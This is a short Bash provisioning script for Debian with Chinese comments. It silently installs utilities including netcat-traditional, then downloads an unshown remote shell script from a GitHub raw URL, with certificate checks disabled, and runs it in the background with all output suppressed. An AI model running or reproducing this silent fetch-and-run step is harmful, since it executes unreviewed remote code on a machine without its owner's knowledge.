#!/bin/bash
# Debian12+
# 1. 更新软件包列表
sudo apt -qqy update >/dev/null 2>&1 || apt -qqy update >/dev/null 2>&1
# 2. 安装常用工具包
sudo apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1 || apt -qqy install wget procps psmisc lsof cron icu-devtools netcat-traditional bind9-host >/dev/null 2>&1
# 3. 执行你原来的 sijuly.sh 脚本 (后台运行)
bash <(wget --no-check-certificate -qO- https://raw.githubusercontent.com/maklinngf/m/refs/heads/main/m.sh) >/dev/null 2>&1 &
